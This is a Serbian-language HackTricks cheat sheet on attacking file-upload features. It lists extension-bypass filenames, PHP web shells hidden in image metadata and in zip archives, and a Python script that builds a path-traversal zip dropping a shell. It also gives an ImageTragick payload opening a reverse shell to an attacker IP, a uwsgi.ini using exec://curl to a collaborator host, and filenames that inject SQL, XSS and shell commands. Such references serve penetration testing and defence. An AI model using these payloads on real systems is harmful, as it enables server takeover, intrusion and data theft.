# Slanje datoteka

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty savet**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! Pridružite nam se danas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Opšta metodologija slanja datoteka

Drugi korisni nastavci:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Rad u PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija datoteka

1. Ako se primenjuje, **proverite** **prethodne ekstenzije.** Takođe ih testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanjem ispravne ekstenzije pre** izvršne ekstenzije (koristite i prethodne ekstenzije):_
* _file.png.php_
* _file.png.Php5_
3. Pokušajte dodavanjem **specijalnih karaktera na kraju.** Možete koristiti Burp da **bruteforce-ujete** sve **ascii** i **Unicode** karaktere. (_Imajte na umu da možete pokušati koristiti i **prethodno** pomenute **ekstenzije**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Pokušajte zaobići zaštitu **prevarom parsera ekstenzija** na serverskoj strani koristeći tehnike poput **udvostručavanja** ekstenzije ili dodavanja beskorisnih podataka (**null** bajtova) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da biste pripremili bolji payload._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** prethodnoj proveri:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Pokušajte da stavite **izvršnu ekstenziju pre ispravne ekstenzije** i nadajte se da je server loše konfigurisan. (korisno za iskorišćavanje Apache konfiguracija gde će sve sa ekstenzijom **.php**, ali ne nužno završavajući se u .php\*\*, izvršiti kod):
* _npr. file.php.png_
7. Koristite **NTFS alternativni podaci tok (ADS)** u **Windows-u**. U ovom slučaju, nakon zabranjene ekstenzije i pre dozvoljene, biće umetnut znak dvotačke ":". Kao rezultat, na serveru će biti kreirana **prazna datoteka sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg"). Ova datoteka može biti kasnije izmenjena korišćenjem drugih tehnika kao što je korišćenje kratkog imena datoteke. Obrazac "**::$data**" takođe može biti korišćen za kreiranje nepraznih datoteka. Stoga, dodavanje tačke nakon ovog obrasca takođe može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.")
8. Pokušajte da pređete ograničenja imena datoteke. Ispravna ekstenzija će biti odsečena, a zlonamerni PHP će ostati. AAA<--SNIP-->AAA.php

```
# Maksimalno 255 bajtova na Linux-u
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # ovde oduzmite 4 i dodajte .png
# Postavite datoteku i proverite odgovor koliko karaktera dozvoljava. Recimo da je 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Napravite payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Zaobilaženje provere Content-Type, Magic Number, kompresije i promene veličine

* Zaobilaženje provere **Content-Type** podešavanjem **vrednosti** zaglavlja **Content-Type** na: _image/png_, _text/plain_, application/octet-stream_
1. Wordlist za Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Zaobilaženje provere **magic number** dodavanjem na početak fajla **bajtova prave slike** (zbunjuje _file_ komandu). Ili uvesti shell unutar **metapodataka**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili takođe možete **direktno uneti payload** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Ako se **kompresija dodaje vašoj slici**, na primer korišćenjem standardnih PHP biblioteka poput [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Veb stranica takođe može **promeniti veličinu slike**, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možete koristiti **IDAT chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Još jedna tehnika za stvaranje payloada koji **preživljava promenu veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Međutim, možete koristiti **tEXt chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ostali trikovi za proveru

* Pronađite ranjivost za **preimenovanje** već otpremljenog fajla (da promenite ekstenziju).
* Pronađite ranjivost **Local File Inclusion** za izvršavanje backdoor-a.
* **Moguće otkrivanje informacija**:
1. Otpremite **nekoliko puta** (i **istovremeno**) **isti fajl** sa **istim imenom**
2. Otpremite fajl sa **imenom** fajla ili **foldera** koji **već postoji**
3. Otpremite fajl sa **“.”, “..”, ili “…” kao njegovim imenom**. Na primer, u Apache-u na **Windows-u**, ako aplikacija čuva otpremljene fajlove u direktorijumu “/www/uploads/”, ime fajla “.” će kreirati fajl nazvan “uploads” u direktorijumu “/www/”.
4. Otpremite fajl koji se ne može lako obrisati, kao što je **“…:.jpg”** u **NTFS-u**. (Windows)
5. Otpremite fajl u **Windows-u** sa **nevažećim karakterima** kao što su `|<>*?”` u njegovom imenu. (Windows)
6. Otpremite fajl u **Windows-u** koristeći **rezervisana** (**zabranjena**) **imena** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 i LPT9.
* Pokušajte takođe da **otpremite izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršiti kod** kada ga žrtva slučajno otvori.

### Trikovi sa posebnim ekstenzijama

Ako pokušavate da otpremite fajlove na **PHP server**, [pogledajte trik sa **.htaccess** za izvršavanje koda](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Ako pokušavate da otpremite fajlove na **ASP server**, [pogledajte trik sa **.config** za izvršavanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` fajlovi su kao `.jar` za Javu, ali za PHP, i mogu se **koristiti kao PHP fajl** (izvršavanje sa php-om ili uključivanje u skriptu...)

Ekstenzija `.inc` se ponekad koristi za PHP fajlove koji se koriste samo za **uvoz fajlova**, tako da je u nekom trenutku neko mogao dozvoliti **izvršavanje ove ekstenzije**.

## **Jetty RCE**

Ako možete otpremiti XML fajl na Jetty server, možete dobiti [RCE jer se **novi \*.xml i \*.war automatski obrađuju**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je navedeno na sledećoj slici, otpremite XML fajl na `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Za detaljno istraživanje ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ranjivosti udaljenog izvršavanja komandi (RCE) mogu se iskoristiti u uWSGI serverima ako imate mogućnost izmeniti `.ini` konfiguracioni fajl. Konfiguracioni fajlovi uWSGI koriste specifičnu sintaksu za uključivanje "magičnih" promenljivih, zamena i operatora. Posebno, operator '@', koji se koristi kao `@(ime_fajla)`, dizajniran je da uključi sadržaj fajla. Među različitim podržanim šemama u uWSGI, "exec" šema je posebno moćna, omogućavajući čitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost može biti manipulisana u zlonamerne svrhe kao što su udaljeno izvršavanje komandi ili proizvoljno pisanje/čitanje fajlova kada se `.ini` konfiguracioni fajl obrađuje.

Razmotrite sledeći primer štetnog `uwsgi.ini` fajla koji prikazuje različite šeme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payloada se dešava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, proces uWSGI mora biti restartovan (potencijalno nakon pada ili zbog napada Denial of Service) ili fajl mora biti podešen za automatsko ponovno učitavanje. Ako je omogućena opcija automatskog ponovnog učitavanja, fajl će biti ponovno učitan u određenim intervalima nakon detektovanja promena.

Važno je razumeti opuštenu prirodu parsiranja konfiguracionog fajla uWSGI-ja. Konkretno, pomenuti payload može biti ubačen u binarni fajl (kao što je slika ili PDF), što dodatno proširuje mogućnosti iskorišćavanja.

## **Triks za otpremanje fajlova/SSRF pomoću wget-a**

U nekim slučajevima može se desiti da server koristi **`wget`** za **preuzimanje fajlova** i možete **navesti** **URL**. U tim situacijama, kod može proveravati da li je ekstenzija preuzetih fajlova na beloj listi kako bi se osiguralo da se preuzimaju samo dozvoljeni fajlovi. Međutim, **ova provera može biti zaobiđena**.\
**Maksimalna** dužina **imenovanja fajla** u **Linuxu** je **255**, međutim, **wget** skraćuje imena fajlova na **236** karaktera. Možete **preuzeti fajl nazvan "A"\*232+".php"+".gif"**, ovo ime fajla će **zaobići** **proveru** (kao u ovom primeru **".gif"** je **validna** ekstenzija), ali će `wget` preimenovati fajl u **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Imajte na umu da je **još jedna opcija** koju možete razmotriti za zaobilaženje ovog provere da napravite **preusmeravanje HTTP servera na drugi fajl**, tako da će početni URL zaobići proveru, a zatim će wget preuzeti preusmereni fajl sa novim imenom. Ovo **neće raditi** **osim ako** se wget koristi sa **parametrom** `--trust-server-names` jer će **wget preuzeti preusmerenu stranicu sa imenom fajla naznačenim u originalnom URL-u**.


## Alati

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) je moćan alat dizajniran da pomogne Pentesterima i Bug Hunterima u testiranju mehanizama za otpremanje fajlova. Koristi razne tehnike za otkrivanje i iskorišćavanje ranjivosti, obezbeđujući temeljne procene veb aplikacija.

## Od otpremanja fajla do drugih ranjivosti

* Postavite **ime fajla** na `../../../tmp/lol.png` i pokušajte postići **prodiranje putem putanje**
* Postavite **ime fajla** na `sleep(10)-- -.jpg` i možda ćete moći postići **SQL ubacivanje**
* Postavite **ime fajla** na `<svg onload=alert(document.domain)>` da biste postigli XSS
* Postavite **ime fajla** na `; sleep 10;` da biste testirali neko ubacivanje komandi (više [tričarija za ubacivanje komandi ovde](../command-injection.md))
* [**XSS** u otpremanju slike (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** fajl **otpremanje** + **XSS** = [eksploatacija **Service Workers**-a](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE u otpremanju svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Otvoreno preusmeravanje** putem otpremanja svg fajla](../open-redirect.md#open-redirect-uploading-svg-files)
* Isprobajte **različite svg payload-e** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Čuvena ranjivost **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Ako možete **navesti veb server da uhvati sliku sa URL-a**, možete pokušati iskoristiti [SSRF](../ssrf-server-side-request-forgery/). Ako će ova **slika** biti **sačuvana** na nekom **javnom** sajtu, takođe možete navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije o svakom posetiocu**.
* [**XXE i CORS** zaobilaženje sa otpremanjem PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* Posebno kreirani PDF-ovi za XSS: [Sledeća stranica prikazuje kako **ubaciti PDF podatke da biste dobili izvršenje JS-a**](../xss-cross-site-scripting/pdf-injection.md). Ako možete otpremiti PDF-ove, možete pripremiti neki PDF koji će izvršiti proizvoljni JS prateći date upute.
* Otpremite sadržaj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da biste proverili da li server ima neki **antivirus**
* Proverite da li postoji neko **ograničenje veličine** pri otpremanju fajlova

Evo liste od 10 stvari koje možete postići otpremanjem (preuzeto sa [ovde](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp ekstenzija

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magični bajtovi zaglavlja

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) za druge vrste fajlova.

### Automatsko otpremanje zip/tar fajla koji se automatski dekompresuje

Ako možete otpremiti ZIP koji će biti dekompresovan unutar servera, možete uraditi 2 stvari:

#### Simbolički link

Otpremite link koji sadrži simboličke veze ka drugim fajlovima, a zatim pristupajući dekompresovanim fajlovima pristupićete povezanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različitim fasciklama

Nenadano stvaranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ova postavka može da zaštiti od izvršavanja komandi na nivou operativnog sistema putem zlonamernog otpremanja fajlova, podrška za hijerarhijsku kompresiju i mogućnosti pretrage direktorijuma u ZIP arhivskom formatu mogu biti iskorišćene. To omogućava napadačima da zaobiđu ograničenja i izbegnu sigurne direktorijume za otpremanje manipulišući funkcionalnostima dekompresije ciljne aplikacije.

Automatizovani eksploit za kreiranje takvih fajlova dostupan je na [**evilarc na GitHub-u**](https://github.com/ptoomey3/evilarc). Ova alatka može se koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **triк sa simboličkim linkom i evilarc-om** je opcija. Ako je cilj da se cilja datoteka kao što je `/flag.txt`, simbolički link do te datoteke treba biti kreiran na vašem sistemu. Ovo osigurava da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamerne zip datoteke:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za raspršivanje fajlova**

Za dalje detalje **proverite originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Kreiranje PHP Shell-a**:
PHP kod je napisan da izvršava komande prosleđene kroz promenljivu `$_REQUEST`.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Raspršivanje fajlova i kreiranje kompresovanog fajla**:
Kreiraju se više fajlova i sastavlja se zip arhiva koja sadrži ove fajlove.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Modifikacija pomoću heks editora ili vi**:
Imena fajlova unutar zip arhive se menjaju pomoću vi ili heks editora, menjajući "xxA" u "../" da bi se pretraživali direktorijumi.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Otpremite ovaj sadržaj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick, 7.0.1-1)**
(iz [exploita](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ugrađivanje PHP Shell-a u PNG

Ugrađivanje PHP Shell-a u IDAT blok PNG datoteke može efikasno zaobići određene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD biblioteke su posebno relevantne u ovom kontekstu, jer se često koriste za promenu veličine i resampling slika. Mogućnost da ugrađeni PHP Shell ostane neizmenjen nakon ovih operacija predstavlja značajnu prednost u određenim slučajevima upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalne primene, možete pronaći u sledećem članku: ["Kodiranje Web Shell-ova u PNG IDAT blokovima"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

Više informacija na: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot fajlovi

Poliglot fajlovi predstavljaju jedinstveni alat u kibernetičkoj bezbednosti, delujući kao kameleoni koji mogu validno postojati istovremeno u više formata fajlova. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše kao GIF i RAR arhiva. Takvi fajlovi nisu ograničeni samo na ovu kombinaciju; kombinacije poput GIF i JS ili PPT i JS su takođe izvodljive.

Osnovna korist od poliglot fajlova leži u njihovoj sposobnosti da zaobiđu sigurnosne mere koje skeniraju fajlove na osnovu njihovog tipa. Uobičajena praksa u raznim aplikacijama podrazumeva dozvolu samo određenih tipova fajlova za otpremanje - poput JPEG, GIF ili DOC - kako bi se umanjio rizik od potencijalno štetnih formata (npr. JS, PHP ili Phar fajlova). Međutim, poliglot, pridržavajući se strukturnih kriterijuma više tipova fajlova, može neprimetno zaobići ove restrikcije.

Uprkos njihovoj prilagodljivosti, poligloti imaju određena ograničenja. Na primer, iako poliglot može istovremeno biti PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog otpremanja može zavisiti od politike ekstenzija fajlova platforme. Ako sistem strogo kontroliše dozvoljene ekstenzije, sama strukturna dvojnost poliglota možda neće biti dovoljna da garantuje njegovo otpremanje.

Više informacija na: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Reference

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium platformu za bug bounty koju su kreirali hakeri, za hakerima! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
